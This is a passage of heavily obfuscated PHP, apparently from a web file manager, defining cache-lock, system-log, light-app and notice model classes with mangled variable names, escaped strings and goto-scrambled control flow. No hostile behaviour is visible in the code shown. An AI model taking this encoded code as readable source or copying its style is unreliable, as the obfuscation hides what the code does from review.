!0; } } } cacheLockWait(); } return !1; } public function lockGet($fÁÅàİ’¼Ÿ) { return Cache::init()->get($fÁÅàİ’¼Ÿ); } public function unlock($c¯±Û•Üƒ·) { return Cache::init()->remove($c¯±Û•Üƒ·); } } goto Eöœä†•–‘; dòË ¾¸¤: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\x2e\x4c\151\x67\150\x74\101\x70\160"; public $modelType = "\123\171\x73\164\x65\155\x4f\160\x74\x69\x6f\x6e"; public $field = array("\x6e\141\x6d\145", "\147\162\x6f\165\x70", "\x64\x65\163\143", "\x63\157\x6e\164\145\156\x74"); public function listData($aÀä„°É‚ª = false, $Fî¿æÃ¾Í™ = "\155\x6f\144\x69\x66\x79\x54\151\x6d\x65", $fì²…Š‹¸İ = true) { return parent::listData($aÀä„°É‚ª, $Fî¿æÃ¾Í™, $fì²…Š‹¸İ); } public function remove($F£Ğë½ì™À) { $FÄš“ŠÕó£ = $this->findByName($F£Ğë½ì™À); if (!$FÄš“ŠÕó£) { return !1; } return parent::remove($FÄš“ŠÕó£[$_SERVER[”Ì÷ñ­î¸][367]]); } public function add($c¶Ô¥ì÷˜©) { if ($this->findByName($c¶Ô¥ì÷˜©[$_SERVER[”Ì÷ñ­î¸][28]])) { return !1; } return parent::insert($c¶Ô¥ì÷˜©); } public function update($FŠ©é‘ï, $a©³´§„) { $D‘¨Ñë‘•» =& $_SERVER[”Ì÷ñ­î¸]; $f‘¤¢õäî = $this->findByName($FŠ©é‘ï); $FŒ¤§‡„– = $this->findByName($a©³´§„[$D‘¨Ñë‘•»[28]]); if (!$f‘¤¢õäî || $FŒ¤§‡„– && $FŒ¤§‡„–[$D‘¨Ñë‘•»[367]] != $f‘¤¢õäî[$D‘¨Ñë‘•»[367]]) { return !1; } return parent::update($f‘¤¢õäî[$D‘¨Ñë‘•»[367]], $a©³´§„); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\145\155\x5f\x6c\157\x67"; protected $dataAuto = array(array("\x63\162\x65\141\x74\145\124\x69\x6d\x65", "\164\151\155\x65", "\x69\156\163\145\162\164", "\146\x75\x6e\143\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $Eá¸ßÄŒ• =& $_SERVER[”Ì÷ñ­î¸]; return array($Eá¸ßÄŒ•[2380] => LNG($Eá¸ßÄŒ•[2381]), $Eá¸ßÄŒ•[2382] => LNG($Eá¸ßÄŒ•[2383]), $Eá¸ßÄŒ•[2046] => LNG($Eá¸ßÄŒ•[2384]), $Eá¸ßÄŒ•[2385] => LNG($Eá¸ßÄŒ•[2386]), $Eá¸ßÄŒ•[2387] => LNG($Eá¸ßÄŒ•[2388]), $Eá¸ßÄŒ•[2389] => LNG($Eá¸ßÄŒ•[2390]), $Eá¸ßÄŒ•[2391] => LNG($Eá¸ßÄŒ•[2392]), $Eá¸ßÄŒ•[2393] => LNG($Eá¸ßÄŒ•[2394]), $Eá¸ßÄŒ•[2077] => LNG($Eá¸ßÄŒ•[2395]), $Eá¸ßÄŒ•[2078] => LNG($Eá¸ßÄŒ•[2396]), $Eá¸ßÄŒ•[2397] => LNG($Eá¸ßÄŒ•[2398]), $Eá¸ßÄŒ•[2399] => LNG($Eá¸ßÄŒ•[2400]), $Eá¸ßÄŒ•[2401] => LNG($Eá¸ßÄŒ•[2402]), $Eá¸ßÄŒ•[2403] => LNG($Eá¸ßÄŒ•[2404]), $Eá¸ßÄŒ•[2075] => LNG($Eá¸ßÄŒ•[2405]), $Eá¸ßÄŒ•[2081] => LNG($Eá¸ßÄŒ•[2406]), $Eá¸ßÄŒ•[2407] => LNG($Eá¸ßÄŒ•[2408]), $Eá¸ßÄŒ•[2409] => LNG($Eá¸ßÄŒ•[2410]), $Eá¸ßÄŒ•[2411] => LNG($Eá¸ßÄŒ•[2412]), $Eá¸ßÄŒ•[2413] => LNG($Eá¸ßÄŒ•[2414]), $Eá¸ßÄŒ•[2084] => LNG($Eá¸ßÄŒ•[2415]), $Eá¸ßÄŒ•[2085] => LNG($Eá¸ßÄŒ•[2416]), $Eá¸ßÄŒ•[2417] => LNG($Eá¸ßÄŒ•[2418]), $Eá¸ßÄŒ•[2419] => LNG($Eá¸ßÄŒ•[2420]), $Eá¸ßÄŒ•[2421] => LNG($Eá¸ßÄŒ•[2422]), $Eá¸ßÄŒ•[2423] => LNG($Eá¸ßÄŒ•[2424]), $Eá¸ßÄŒ•[2425] => LNG($Eá¸ßÄŒ•[2426]), $Eá¸ßÄŒ•[2079] => LNG($Eá¸ßÄŒ•[2427]), $Eá¸ßÄŒ•[2428] => LNG($Eá¸ßÄŒ•[2429]), $Eá¸ßÄŒ•[2430] => LNG($Eá¸ßÄŒ•[2431]), $Eá¸ßÄŒ•[2432] => LNG($Eá¸ßÄŒ•[2432]), $Eá¸ßÄŒ•[2433] => LNG($Eá¸ßÄŒ•[2050]), $Eá¸ßÄŒ•[2434] => LNG($Eá¸ßÄŒ•[2435]), $Eá¸ßÄŒ•[2436] => LNG($Eá¸ßÄŒ•[2437]), $Eá¸ßÄŒ•[2438] => LNG($Eá¸ßÄŒ•[2439]), $Eá¸ßÄŒ•[2440] => LNG($Eá¸ßÄŒ•[2441]), $Eá¸ßÄŒ•[2442] => LNG($Eá¸ßÄŒ•[2443]), $Eá¸ßÄŒ•[2444] => LNG($Eá¸ßÄŒ•[2444]), $Eá¸ßÄŒ•[2445] => LNG($Eá¸ßÄŒ•[2446]), $Eá¸ßÄŒ•[2447] => LNG($Eá¸ßÄŒ•[2448]), $Eá¸ßÄŒ•[2449] => LNG($Eá¸ßÄŒ•[2450]), $Eá¸ßÄŒ•[2451] => LNG($Eá¸ßÄŒ•[2452]), $Eá¸ßÄŒ•[2453] => LNG($Eá¸ßÄŒ•[2454]), $Eá¸ßÄŒ•[2455] => LNG($Eá¸ßÄŒ•[2456])); } private function typeFile() { $CäÁÅÆ Š® =& $_SERVER[”Ì÷ñ­î¸]; $CÎ½‡Á·ŒĞ = array($CäÁÅÆ Š®[2081] => array($CäÁÅÆ Š®[2082]), $CäÁÅÆ Š®[2401] => array($CäÁÅÆ Š®[2457]), $CäÁÅÆ Š®[2403] => array($CäÁÅÆ Š®[2458]), $CäÁÅÆ Š®[2075] => array($CäÁÅÆ Š®[2076]), $CäÁÅÆ Š®[2409] => array(), $CäÁÅÆ Š®[2411] => array(), $CäÁÅÆ Š®[2413] => array(), $CäÁÅÆ Š®[2084] => array($CäÁÅÆ Š®[2086]), $CäÁÅÆ Š®[2085] => array($CäÁÅÆ Š®[2086]), $CäÁÅÆ Š®[2417] => array($CäÁÅÆ Š®[2459]), $CäÁÅÆ Š®[2419] => array($CäÁÅÆ Š®[2459]), $CäÁÅÆ Š®[2421] => array($CäÁÅÆ Š®[2460]), $CäÁÅÆ Š®[2407] => array($CäÁÅÆ Š®[2461]), $CäÁÅÆ Š®[2423] => array($CäÁÅÆ Š®[2462]), $CäÁÅÆ Š®[2425] => array($CäÁÅÆ Š®[2463]), $CäÁÅÆ Š®[2079] => array($CäÁÅÆ Š®[2080])); return $CÎ½‡Á·ŒĞ; } private function typeAll() { goto b˜Ã‹Ñ‡â…; b˜Ã‹Ñ‡â…: $f‘’¯ä¤Ù =& $_SERVER[”Ì÷ñ­î¸]; $AîÄá±Ã  = $this->typeList; $då¨“°¦Ø = array_filter($this->typeFile()); goto BÒƒíÅ†ñ; BÒƒíÅ†ñ: foreach ($då¨“°¦Ø as $Cİ™ÅÛéˆ» => $CÄ«‰³ÇÕë) { $AîÄá±Ã [$CÄ«‰³ÇÕë[0]] = $AîÄá±Ã [$Cİ™ÅÛéˆ»]; } $AîÄá±Ã [$f‘’¯ä¤Ù[2086]] = LNG($f‘’¯ä¤Ù[2464]); $AîÄá±Ã [$f‘’¯ä¤Ù[2459]] = LNG($f‘’¯ä¤Ù[2465]); goto eä©‡•ª²×; eä©‡•ª²×: return $AîÄá±Ã ; goto Fè‡Ä¿îˆ´; Fè‡Ä¿îˆ´: } public function addLog($BŞß²È¯¦“, $Cçæ—Ç—ä‹ = array()) { goto b‘î¥ÜŸ£ä; aõÅ‡‚ØÇ£: $dÀ¯æƒö = get_client_ip(); if (!$Cçæ—Ç—ä‹ || strlen(json_encode($Cçæ—Ç—ä‹)) >= 1024) { $Cçæ—Ç—ä‹ = array($c‚¯Íƒ‰©õ[2466] => $dÀ¯æƒö); } else { if (is_array($Cçæ—Ç—ä‹)) { $Cçæ—Ç—ä‹[$c‚¯Íƒ‰©õ[2466]] = $dÀ¯æƒö; } else { $Cçæ—Ç—ä‹ = array($c‚¯Íƒ‰©õ[1034] => $Cçæ—Ç—ä‹, $c‚¯Íƒ‰©õ[2466] => $dÀ¯æƒö); } } $Cçæ—Ç—ä‹ = array($c‚¯Íƒ‰©õ[1429] => Session::sign(), $c‚¯Íƒ‰©õ[1430] => $FˆàÙÇàå÷, $c‚¯Íƒ‰©õ[29] => $BŞß²È¯¦“, $c‚¯Íƒ‰©õ[1432] => json_encode($Cçæ—Ç—ä‹)); goto bëæò±¿–ã; bëæò±¿–ã: parent::add($Cçæ—Ç—ä‹); goto F³Ô§•‡é; b‘î¥ÜŸ£ä: $c‚¯Íƒ‰©õ =& $_SERVER[”Ì÷ñ­î¸]; if (!isset($this->typeList[$BŞß²È¯¦“])) { return; } $FˆàÙÇàå÷ = USER_ID ? USER_ID : (isset($Cçæ—Ç—ä‹[$c‚¯Íƒ‰©õ[1439]]) ? $Cçæ—Ç—ä‹[$c‚¯Íƒ‰©õ[1439]] : 0); goto aõÅ‡‚ØÇ£; F³Ô§•‡é: } public function remove($BŠæÃĞ‰ò) { $this->where(array($_SERVER[”Ì÷ñ­î¸][385] => $BŠæÃĞ‰ò))->delete(); } private function _makeOrder($D¡÷¾„‹•Ñ = '') { goto B«²ö«ØğŒ; B«²ö«ØğŒ: $a¼©î µÔ =& $_SERVER[”Ì÷ñ­î¸]; $eóéŞ’Š’µ = $a¼©î µÔ[187]; $C««‚ÑÌ´Ó = array($a¼©î µÔ[402] => $a¼©î µÔ[403], $a¼©î µÔ[404] => $a¼©î µÔ[405]); goto B°åÆë‚¬Ë; aã‡øÂŸÔ«: return $this->order($D¡÷¾„‹•Ñ); goto A‰•è¿ŠÓÃ; B°åÆë‚¬Ë: $EŞàœÀâÎ = Input::get($a¼©î µÔ[408], $a¼©î µÔ[7], $a¼©î µÔ[2244], array($a¼©î µÔ[2181], $a¼©î µÔ[404])); $EŞàœÀâÎ = $C««‚ÑÌ´Ó[$EŞàœÀâÎ]; $D¡÷¾„‹•Ñ = $D¡÷¾„‹•Ñ . "{$eóéŞ’Š’µ}\x20{$EŞàœÀâÎ}"; goto aã‡øÂŸÔ«; A‰•è¿ŠÓÃ: } public function get($A¦øçÃöÕ— = '') { goto AÎÓ‡Èó¦; b·éË¨‚Ê: if ($A¦øçÃöÕ—[$eŸèŞÏŸÛ[1439]]) { $fßõëèù±¯[$eŸèŞÏŸÛ[1439]] = $A¦øçÃöÕ—[$eŸèŞÏŸÛ[1439]]; } if (isset($A¦øçÃöÕ—[$eŸèŞÏŸÛ[703]])) { $Eòå¡œß›Û = $A¦øçÃöÕ—[$eŸèŞÏŸÛ[703]]; $dä¦ôËÍ¢ˆ = isset($A¦øçÃöÕ—[$eŸèŞÏŸÛ[704]]) ? $A¦øçÃöÕ—[$eŸèŞÏŸÛ[704]] : time(); $fßõëèù±¯[$eŸèŞÏŸÛ[187]] = array($eŸèŞÏŸÛ[321], array($Eòå¡œß›Û, $dä¦ôËÍ¢ˆ)); } if ($A¦øçÃöÕ—[$eŸèŞÏŸÛ[29]]) { $eë¡×½òçª = explode($eŸèŞÏŸÛ[47], $A¦øçÃöÕ—[$eŸèŞÏŸÛ[29]]); $A‰¥øßÆ´° = $this->typeFile(); $DÇ¯Àä©ó = array(); foreach ($eë¡×½òçª as $F—¾ÛÙã’Ô) { $DÇ¯Àä©ó[] = $F—¾ÛÙã’Ô; if (isset($A‰¥øßÆ´°[$F—¾ÛÙã’Ô])) { $DÇ¯Àä©ó = array_merge($DÇ¯Àä©ó, $A‰¥øßÆ´°[$F—¾ÛÙã’Ô]); } } $DÇ¯Àä©ó = array_unique($DÇ¯Àä©ó); if ($DÇ¯Àä©ó) { $fßõëèù±¯[$eŸèŞÏŸÛ[29]] = array($eŸèŞÏŸÛ[7], $DÇ¯Àä©ó); } } goto dÇæã³éÓ; Eæì·¸èš: $fÔº‹Ø›ñ[$eŸèŞÏŸÛ[354]] = $this->logList($fÔº‹Ø›ñ[$eŸèŞÏŸÛ[354]]); return $fÔº‹Ø›ñ; goto bæ¯å¡ƒµĞ; dÇæã³éÓ: if (!empty($A¦øçÃöÕ—[$eŸèŞÏŸÛ[2466]])) { $fßõëèù±¯[$eŸèŞÏŸÛ[405]] = array($eŸèŞÏŸÛ[753], "\45{$A¦øçÃöÕ—[$eŸèŞÏŸÛ[2466]]}\45"); } $fÔº‹Ø›ñ = $this->_makeOrder()->where($fßõëèù±¯)->selectPage(); if (empty($fÔº‹Ø›ñ[$eŸèŞÏŸÛ[354]])) { show_json(array(), !0, $fÔº‹Ø›ñ[$eŸèŞÏŸÛ[351]]); } goto Eæì·¸èš; AÎÓ‡Èó¦: $eŸèŞÏŸÛ =& $_SERVER[”Ì÷ñ­î¸]; if (!$A¦øçÃöÕ—) { show_json(array()); } $fßõëèù±¯ = array(); goto b·éË¨‚Ê; bæ¯å¡ƒµĞ: } private function ipAddress(&$c¢¥Ûéã¬²) { $aÔ×œîä«Š =& $_SERVER[”Ì÷ñ­î¸]; if (!empty($c¢¥Ûéã¬²[$aÔ×œîä«Š[2466]])) { $f·Õ˜–³½¤ = IpLocation::get($c¢¥Ûéã¬²[$aÔ×œîä«Š[2466]]); if ($f·Õ˜–³½¤ == $aÔ×œîä«Š[2467]) { $f·Õ˜–³½¤ = $aÔ×œîä«Š[2468]; } } else { $f·Õ˜–³½¤ = LNG($aÔ×œîä«Š[2469]); } $c¢¥Ûéã¬²[$aÔ×œîä«Š[2470]] = $f·Õ˜–³½¤; } private function descZipDownload($dßì·¸‘, &$BôÜÜİæ—‹) { $Dè õÛ”† =& $_SERVER[”Ì÷ñ­î¸]; if (!isset($dßì·¸‘[$Dè õÛ”†[2471]])) { return; } $Eè×âĞ¹Š¥ = json_decode($dßì·¸‘[$Dè õÛ”†[2471]], !0); foreach ($Eè×âĞ¹Š¥ as $eˆ¬‹ÁËÂæ) { if (!IO::init($eˆ¬‹ÁËÂæ[$Dè õÛ”†[75]])) { continue; } if (!($D›µ—¦½³ = IO::infoFull($eˆ¬‹ÁËÂæ[$Dè õÛ”†[75]]))) { continue; } $dßì·¸‘[$Dè õÛ”†[75]] = $eˆ¬‹ÁËÂæ[$Dè õÛ”†[75]]; $BôÜÜİæ—‹[] = $dßì·¸‘[$Dè õÛ”†[369]] = $D›µ—¦½³[$Dè õÛ”†[369]]; $BôÜÜİæ—‹[] = $dßì·¸‘[$Dè õÛ”†[2287]] = $D›µ—¦½³[$Dè õÛ”†[461]]; break; } return $dßì·¸‘; } private function getSourceList(&$DÙ´›áºğ) { $B©ÑäâÖ’ =& $_SERVER[”Ì÷ñ­î¸]; $aÎ°å†È‡ = array(); foreach ($DÙ´›áºğ as $E’«ß†ñæ => $B”¼ï†˜¯¯) { goto cíÃÕ´æÕÜ; b³õŠ–«Ò: if ($BÛÙòÉÃ™[$B©ÑäâÖ’[29]] == $B©ÑäâÖ’[2295]) { $aÎ°å†È‡[] = $BÛÙòÉÃ™[$B©ÑäâÖ’[405]][$B©ÑäâÖ’[369]]; } goto c£º™¢ˆ¡; cíÃÕ´æÕÜ: $BÛÙòÉÃ™ = json_decode($B”¼ï†˜¯¯[$B©ÑäâÖ’[405]], !0); if ($B”¼ï†˜¯¯[$B©ÑäâÖ’[29]] == $B©ÑäâÖ’[2078]) { $BÛÙòÉÃ™ = $this->descZipDownload($BÛÙòÉÃ™, $aÎ°å†È‡); $DÙ´›áºğ[$E’«ß†ñæ][$B©ÑäâÖ’[405]] = json_encode($BÛÙòÉÃ™); continue; } if (strpos($B”¼ï†˜¯¯[$B©ÑäâÖ’[29]], $B©ÑäâÖ’[2288]) !== 0) { goto d²¨•×°¥; d²¨•×°¥: if (!isset($BÛÙòÉÃ™[$B©ÑäâÖ’[75]]) || strpos($B”¼ï†˜¯¯[$B©ÑäâÖ’[29]], $B©ÑäâÖ’[2472]) !== 0) { continue; } if (!IO::init($BÛÙòÉÃ™[$B©ÑäâÖ’[75]])) { continue; } if (!($aÃö œŠ³æ = IO::infoFull($BÛÙòÉÃ™[$B©ÑäâÖ’[75]]))) { continue; } goto AŸ„³ÔëÂ; AŸ„³ÔëÂ: $aÎ°å†È‡[] = $BÛÙòÉÃ™[$B©ÑäâÖ’[369]] = $aÃö œŠ³æ[$B©ÑäâÖ’[369]]; $aÎ°å†È‡[] = $BÛÙòÉÃ™[$B©ÑäâÖ’[2287]] = $aÃö œŠ³æ[$B©ÑäâÖ’[461]]; $DÙ´›áºğ[$E’«ß†ñæ][$B©ÑäâÖ’[405]] = json_encode($BÛÙòÉÃ™); goto CÀ«Ú¸»; CÀ«Ú¸»: continue; goto CÖŠéØ¸¸; CÖŠéØ¸¸: } goto DÈ¬‘—‹æ‡; DÈ¬‘—‹æ‡: $aÎ°å†È‡[] = $BÛÙòÉÃ™[$B©ÑäâÖ’[369]]; $aÎ°å†È‡[] = $BÛÙòÉÃ™[$B©ÑäâÖ’[2287]]; if ($BÛÙòÉÃ™[$B©ÑäâÖ’[29]] == $B©ÑäâÖ’[492]) { $aÎ°å†È‡[] = $BÛÙòÉÃ™[$B©ÑäâÖ’[405]][$B©ÑäâÖ’[1006]]; $aÎ°å†È‡[] = $BÛÙòÉÃ™[$B©ÑäâÖ’[405]][$B©ÑäâÖ’[1007]]; } goto b³õŠ–«Ò; c£º™¢ˆ¡: } if (!$aÎ°å†È‡) { return array(); } return Model($B©ÑäâÖ’[754])->sourceListInfo($aÎ°å†È‡, !0); } private function logList($Dƒ£ªÄ–£¼) { goto dŒ“×Œ¶“š; dŒ“×Œ¶“š: $cÍğ‡Œ²²® =& $_SERVER[”Ì÷ñ­î¸]; $f°¦ÉÕíî = array_to_keyvalue($Dƒ£ªÄ–£¼, $cÍğ‡Œ²²®[33], $cÍğ‡Œ²²®[1439]); $f÷‡ó§±šÅ = Model($cÍğ‡Œ²²®[477])->userListInfo(array_unique($f°¦ÉÕíî)); goto cí·²ÇÔ²ˆ; DÈÒæÀ²…: return $C†‹ÚŞ¿; goto FÚÁØ¢¼À’; cí·²ÇÔ²ˆ: $f¶Ö´°¡°Ø = $this->getSourceList($Dƒ£ªÄ–£¼); $cäˆÇØš = $this->typeAll(); $C†‹ÚŞ¿ = array(); goto Fßæ«ÇÚíŞ; Fßæ«ÇÚíŞ: $d†Œ¦´ğĞ¤ = array(); foreach ($Dƒ£ªÄ–£¼ as $BÔÜŒªÛŒŸ => $EŒâì„ÊÊ§) { goto c¿ïÜ ë˜è; C¤§ì‹•‘‡: $EŒâì„ÊÊ§[$cÍğ‡Œ²²®[2243]] = $f­±ÛÄ; $eãÁ›íò§ù = json_decode($EŒâì„ÊÊ§[$cÍğ‡Œ²²®[405]], !0); $EŒâì„ÊÊ§[$cÍğ‡Œ²²®[2466]] = isset($eãÁ›íò§ù[$cÍğ‡Œ²²®[2466]]) ? $eãÁ›íò§ù[$cÍğ‡Œ²²®[2466]] : $cÍğ‡Œ²²®[33]; goto CÚ×ì¸ÌĞì; c¿ïÜ ë˜è: $a§¢î‰í« = $EŒâì„ÊÊ§[$cÍğ‡Œ²²®[29]]; $f­±ÛÄ = isset($f÷‡ó§±šÅ[$EŒâì„ÊÊ§[$cÍğ‡Œ²²®[1439]]]) ? $f÷‡ó§±šÅ[$EŒâì„ÊÊ§[$cÍğ‡Œ²²®[1439]]] : !1; $FğĞËÍ™ß— = strpos($a§¢î‰í«, $cÍğ‡Œ²²®[2473]) === 0 ? LNG($cÍğ‡Œ²²®[2474]) : LNG($cÍğ‡Œ²²®[2469]); goto eÃŒÙíñ; eÃŒÙíñ: $EŒâì„ÊÊ§[$cÍğ‡Œ²²®[28]] = isset($f­±ÛÄ[$cÍğ‡Œ²²®[28]]) ? $f­±ÛÄ[$cÍğ‡Œ²²®[28]] : LNG($cÍğ‡Œ²²®[2469]); $EŒâì„ÊÊ§[$cÍğ‡Œ²²®[2335]] = isset($f­±ÛÄ[$cÍğ‡Œ²²®[2335]]) ? $f­±ÛÄ[$cÍğ‡Œ²²®[2335]] : $cÍğ‡Œ²²®[33]; $EŒâì„ÊÊ§[$cÍğ‡Œ²²®[1344]] = isset($cäˆÇØš[$a§¢î‰í«]) ? $cäˆÇØš[$a§¢î‰í«] : $FğĞËÍ™ß—; goto C¤§ì‹•‘‡; CÚ×ì¸ÌĞì: $this->ipAddress($EŒâì„ÊÊ§); if (strpos($a§¢î‰í«, $cÍğ‡Œ²²®[2288]) === 0 || isset($eãÁ›íò§ù[$cÍğ‡Œ²²®[2287]])) { goto A¦Ëİ§†Æğ; E¹±Íš×ˆé: if ($eãÁ›íò§ù[$cÍğ‡Œ²²®[29]] == $cÍğ‡Œ²²®[2295]) { $eãÁ›íò§ù[$cÍğ‡Œ²²®[405]][$cÍğ‡Œ²²®[369]] = $f¶Ö´°¡°Ø[$eãÁ›íò§ù[$cÍğ‡Œ²²®[405]][$cÍğ‡Œ²²®[369]]]; } if ($eãÁ›íò§ù[$cÍğ‡Œ²²®[29]] == $cÍğ‡Œ²²®[2073]) { $eãÁ›íò§ù[$cÍğ‡Œ²²®[2300]] = $eãÁ›íò§ù[$cÍğ‡Œ²²®[391]]; $eãÁ›íò§ù[$cÍğ‡Œ²²®[2287]] = $eãÁ›íò§ù[$cÍğ‡Œ²²®[2300]][$cÍğ‡Œ²²®[369]]; $eãÁ›íò§ù[$cÍğ‡Œ²²®[391]] = !1; $eãÁ›íò§ù[$cÍğ‡Œ²²®[369]] = $cÍğ‡Œ²²®[33]; } if ($eãÁ›íò§ù[$cÍğ‡Œ²²®[391]] && $eãÁ›íò§ù[$cÍğ‡Œ²²®[391]][$cÍğ‡Œ²²®[371]] == $cÍğ‡Œ²²®[1080]) { $d†Œ¦´ğĞ¤[] = $EŒâì„ÊÊ§[$cÍğ‡Œ²²®[367]]; unset($Dƒ£ªÄ–£¼[$BÔÜŒªÛŒŸ]); continue; } goto bÉŸá×¿„¾; bÉŸá×¿„¾: if ($eãÁ›íò§ù[$cÍğ‡Œ²²®[2300]] && $eãÁ›íò§ù[$cÍğ‡Œ²²®[2300]][$cÍğ‡Œ²²®[371]] == $cÍğ‡Œ²²®[1080]) { $d†Œ¦´ğĞ¤[] = $EŒâì„ÊÊ§[$cÍğ‡Œ²²®[367]]; unset($Dƒ£ªÄ–£¼[$BÔÜŒªÛŒŸ]); continue; } goto bÉÚ«‡¯¢È; A¦Ëİ§†Æğ: $eãÁ›íò§ù[$cÍğ‡Œ²²®[391]] = $f¶Ö´°¡°Ø[$eãÁ›íò§ù[$cÍğ‡Œ²²®[369]]]; $eãÁ›íò§ù[$cÍğ‡Œ²²®[2300]] = $f¶Ö´°¡°Ø[$eãÁ›íò§ù[$cÍğ‡Œ²²®[2287]]]; if ($eãÁ›íò§ù[$cÍğ‡Œ²²®[29]] == $cÍğ‡Œ²²®[492]) { $eãÁ›íò§ù[$cÍğ‡Œ²²®[405]][$cÍğ‡Œ²²®[1006]] = $f¶Ö´°¡°Ø[$eãÁ›íò§ù[$cÍğ‡Œ²²®[405]][$cÍğ‡Œ²²®[1006]]]; $eãÁ›íò§ù[$cÍğ‡Œ²²®[405]][$cÍğ‡Œ²²®[1007]] = $f¶Ö´°¡°Ø[$eãÁ›íò§ù[$cÍğ‡Œ²²®[405]][$cÍğ‡Œ²²®[1007]]]; } goto E¹±Íš×ˆé; bÉÚ«‡¯¢È: } $EŒâì„ÊÊ§[$cÍğ‡Œ²²®[405]] = $eãÁ›íò§ù; goto EÇ¿¦¬í†; EÇ¿¦¬í†: unset($EŒâì„ÊÊ§[$cÍğ‡Œ²²®[2475]]); $C†‹ÚŞ¿[] = $EŒâì„ÊÊ§; goto D‹äºé¥½Ü; D‹äºé¥½Ü: } $this->clearSystemPathLog($d†Œ¦´ğĞ¤); goto DÈÒæÀ²…; FÚÁØ¢¼À’: } private function clearSystemPathLog($Fà™‰šŸìÕ) { $D”½ŒéäÔ =& $_SERVER[”Ì÷ñ­î¸]; if (count($Fà™‰šŸìÕ) == 0) { return; } $dª¬áÈö±Ù = array($D”½ŒéäÔ[367] => array($D”½ŒéäÔ[7], array_unique($Fà™‰šŸìÕ))); $this->where($dª¬áÈö±Ù)->delete(); } public function deviceList($EÄ¸Ÿ­¢Í, $CÉ·îšÊò‹ = 0) { $eî‚òŞÄÊï =& $_SERVER[”Ì÷ñ­î¸]; $c²¶“©î·‰ = array($eî‚òŞÄÊï[1439] => $EÄ¸Ÿ­¢Í, $eî‚òŞÄÊï[187] => array($eî‚òŞÄÊï[930], $CÉ·îšÊò‹), $eî‚òŞÄÊï[29] => $eî‚òŞÄÊï[2046]); $e¤ñ†‘’·Æ = array(); $b¡Îï¸ï = $this->field($eî‚òŞÄÊï[2476])->where($c²¶“©î·‰)->order($eî‚òŞÄÊï[2298])->limit(50)->select(); foreach ($b¡Îï¸ï as $eõ¥ß¯£Ï => $cğ‘©ÁÇŞ) { goto E¼‹ª˜ô³ƒ; BÓäï‘Äè: $this->ipAddress($cğ‘©ÁÇŞ); $cğ‘©ÁÇŞ[$eî‚òŞÄÊï[405]] = $aËÕŒ¡¿ƒ£; $e¤ñ†‘’·Æ[$f…éŸ‚ŒÃ] = $cğ‘©ÁÇŞ; goto D¸ÏĞô˜—; E¼‹ª˜ô³ƒ: if ($eõ¥ß¯£Ï > 0 && abs($cğ‘©ÁÇŞ[$eî‚òŞÄÊï[187]] - $b¡Îï¸ï[$eõ¥ß¯£Ï - 1][$eî‚òŞÄÊï[187]]) < 5) { continue; } $aËÕŒ¡¿ƒ£ = json_decode($cğ‘©ÁÇŞ[$eî‚òŞÄÊï[405]], !0); $cğ‘©ÁÇŞ[$eî‚òŞÄÊï[2466]] = isset($aËÕŒ¡¿ƒ£[$eî‚òŞÄÊï[2466]]) ? $aËÕŒ¡¿ƒ£[$eî‚òŞÄÊï[2466]] : $eî‚òŞÄÊï[33]; goto aŠ•²ÙÕ; aŠ•²ÙÕ: unset($aËÕŒ¡¿ƒ£[$eî‚òŞÄÊï[2466]]); $f…éŸ‚ŒÃ = $this->deviceType($aËÕŒ¡¿ƒ£[$eî‚òŞÄÊï[2289]]); if (isset($e¤ñ†‘’·Æ[$f…éŸ‚ŒÃ])) { continue; } goto BÓäï‘Äè; D¸ÏĞô˜—: } return array_values($e¤ñ†‘’·Æ); } public function deviceType($b…ˆõ…ßÓ‡) { return $b…ˆõ…ßÓ‡; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\x2e\x6e\x6f\164\x69\143\145\114\151\x73\164"; public $field = array("\x6e\x61\x6d\x65", "\x63\157\x6e\164\x65\x6e\164", "\141\165\164\x68", "\155\157\x64\x65", "\164\151\x6d\x65", "\164\171\x70\145", "\154\x65\x76\x65\154", "\x65\x6e\x61\x62\154\x65", "\x73\x6f\x72\x74"); public function listData($Cˆ·¼•Ú‚ = false, $A×›Ì°ÀÁ = "\163\x6f\x72\164", $cÂ‡˜ÜŸÓè = false) { return parent::listData($Cˆ·¼•Ú‚, $A×›Ì°ÀÁ, $cÂ‡˜ÜŸÓè); } public function add($b½ ÃâĞæÛ) { $eéÖ›¤Ã”‡ =& $_SERVER[”Ì÷ñ­î¸]; $eÊˆ³„Ì¤× = time(); if ($b½ ÃâĞæÛ[$eéÖ›¤Ã”‡[12]] == $eéÖ›¤Ã”‡[2477]) { $eÊˆ³„Ì¤× = strtotime($b½ ÃâĞæÛ[$eéÖ›¤Ã”‡[190]]); } $b½ ÃâĞæÛ[$eéÖ›¤Ã”‡[190]] = $eÊˆ³„Ì¤×; return parent::insert($b½ ÃâĞæÛ); } public function update($cö‘½–è¬ô, $D‚¨³ãÙùß) { goto cò¦Ö„‰êÔ; a¤ÆğŸæ‹¿: $EÍÃ°²ÓŞ‹ = time(); if ($D‚¨³ãÙùß[$FÚÃ²“Ÿ¦à[12]] == $FÚÃ²“Ÿ¦à[2477]) { $EÍÃ°²ÓŞ‹ = strtotime($D‚¨³ãÙùß[$FÚÃ²“Ÿ¦à[190]]); } $D‚¨³ãÙùß[$FÚÃ²“Ÿ¦à[190]] = $EÍÃ°²ÓŞ‹; goto Bô³«¾‹²; cò¦Ö„‰êÔ: $FÚÃ²“Ÿ¦à =& $_SERVER[”Ì÷ñ­î¸]; $AšÙ‘èÅÚ = $this->listData($cö‘½–è¬ô); if (!$AšÙ‘èÅÚ) { return !1; } goto a¤ÆğŸæ‹¿; Bô³«¾‹²: return parent::update($cö‘½–è¬ô, $D‚¨³ãÙùß); goto bÁ£˜‰ƒ´‰; bÁ£˜‰ƒ´‰: } public function remove($b·ó¾¡á¹•) { $aâò¦ÂäÕ = $this->listData($b·ó¾¡á¹•); if (!$aâò¦ÂäÕ || $aâò¦ÂäÕ[$_SERVER[”Ì÷ñ­î¸][1080]]) { return !1; } return parent::remove($b·ó¾¡á¹•); } public function sort($EìŠØÍ½†, $DÜªãÀ÷¨÷) { return parent::update($EìŠØÍ½†, $DÜªãÀ÷¨÷); } public function enable($F†Œ¸Ù“ˆ, $bàÁÔ²íê•) { return parent::update($F†Œ¸Ù“ˆ, array($_SERVER[”Ì÷ñ­î¸][2478] => $bàÁÔ²íê•)); } private function initUserOption() { 